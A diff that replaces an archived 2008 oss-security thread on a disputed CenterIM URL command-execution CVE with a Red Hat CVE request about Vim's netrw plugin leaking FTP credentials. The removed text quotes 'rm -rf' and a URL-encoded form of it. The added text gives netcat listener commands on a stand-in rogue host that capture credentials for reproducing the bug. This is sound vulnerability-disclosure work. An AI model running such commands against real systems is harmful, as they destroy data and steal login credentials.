@@ -1,69 +1,47 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2008/03/27/7
-Message-ID: <Pine.GSO.4.51.0803271849410.14208@faron.mitre.org>
-Date: Thu, 27 Mar 2008 18:54:07 -0400 (EDT)
-From: "Steven M. Christey" <coley@...us.mitre.org>
-To: oss-security@...ts.openwall.com
-Subject: Re: was: SA29489 CenterIM URL handling flaw
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2008/10/06/4
+Message-ID: <621926943.500791223288784031.JavaMail.root@zmail01.collab.prod.int.phx2.redhat.com>
+Date: Mon, 6 Oct 2008 06:26:24 -0400 (EDT)
+From: Jan Lieskovsky <jlieskov@...hat.com>
+To: coley@...re.org
+Cc: oss-security@...ts.openwall.com, Jan Minář <rdancer@...ncer.org>
+Subject: CVE request - (vim : netrw plugin - ftp user credentials disclosure)
 Content-Type: text/plain; charset=utf-8
 
+Hello Steve,
 
-On Tue, 25 Mar 2008, Nico Golde wrote:
+  could you please allocate a new CVE id for the following
+Vim issue:
 
-> Hi,
-> * Nico Golde <oss-security+ml@...lde.de> [2008-03-25 16:25]:
-> > * Lubomir Kundrak <lkundrak@...hat.com> [2008-03-24 15:08]:
-> > > Ad SA29489 [1] "CenterIM URL Parsing Command Execution Vulnerability"
-> > >
-> > > CenterIM does completely nothing with received URLs. Maybe the
-> > > unfortuate "exploit writer" was using XFCE Terminal [2], or a terminal
-> > > emulator with a similar problem.
-> >
-> > That's partly true. While centerim has no special URL
-> > handler to handle incoming urls it does provide the ability
-> > to list urls in a message by pressing F2. If you press enter
-> > on one of these urls it tries to open it in an external
-> > browser and executes the other commands as well.
+Vulnerability reports: 1, http://www.rdancer.org/vulnerablevim-netrw-credentials-dis.html
+                          (This is another issue than CVE-2008-2712).
 
-This is the kind of situation that CVE adopted the "user-assisted" term
-for: the user assists the attacker in his/her own demise.
+                       2, https://bugzilla.redhat.com/show_bug.cgi?id=461750
 
-> > You see the commands in the URL however so I think the
-> > impact of this is like sending someone a message with
-> > "please type rm -rf ~ in your shell" so the secunia rating
-> > is a bit beyond the actual impact.
+Thread discussing this issue: 
 
-Is the URL still encoded at the time it is viewed?  if so, then I don't
-expect a typical user to notice this equivalent of "rm -rf *":
+http://groups.google.com/group/vim_dev/browse_thread/thread/2f6fad581a037971/a5fcf4c4981d34e6?show_docid=a5fcf4c4981d34e6
 
-  %72%6D%20%2D%72%66%20%2A
+Proposed partial fix: 
 
-and that's part of the "smell test" for user-assisted issues.
+http://mysite.verizon.net/astronaut/vim/index.html#NETRW
 
-Current CVE desc below.
+Affected Vim netrw plugin versions: 
+    a, Vim 7.0 autoloaded netrw plugin versions - from " Date: Jul 24, 2006, Version: 102" till the latest.
+    b, older versions of Vim netrw may be also affected.
 
-- Steve
+Testcase available at:
 
+http://www.rdancer.org/vulnerablevim-netrw-credentials-dis.html (part 4. EXPLOIT)
 
-======================================================
-Name: CVE-2008-1467
-Status: Candidate
-URL: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-1467
-Reference: MILW0RM:5283
-Reference: URL:http://www.milw0rm.com/exploits/5283
-Reference: BID:28362
-Reference: URL:http://www.securityfocus.com/bid/28362
-Reference: FRSIRT:ADV-2008-0956
-Reference: URL:http://www.frsirt.com/english/advisories/2008/0956/references
-Reference: SECUNIA:29489
-Reference: URL:http://secunia.com/advisories/29489
+Note: Slightly modification of the testcase in the "netcat" part may be needed
+      to successfully reproduce the issue. I was using:
 
-** DISPUTED **
+      printf '220\r\n331\r\n' | nc -l ftp.rogue.example.com 31337 > credentials&
+      (and for simulation of successful FTP session login the command:
+      printf '220\r\n331\r\n230\r\n' | nc -l ftp.rogue.example 31337 > credentials &)
 
-CenterIM 4.22.3 and earlier allows user-assisted remote attackers to
-execute arbitrary commands via shell metacharacters in a URI, related
-to "received URLs in the message window."  NOTE: this issue has been
-disputed due to the user-assisted nature, since the URL must be
-selected and launched by the victim.
-
-
+     
+Thanks, Jan
+--
+Jan iankko Lieskovsky / Red Hat Security Response Team
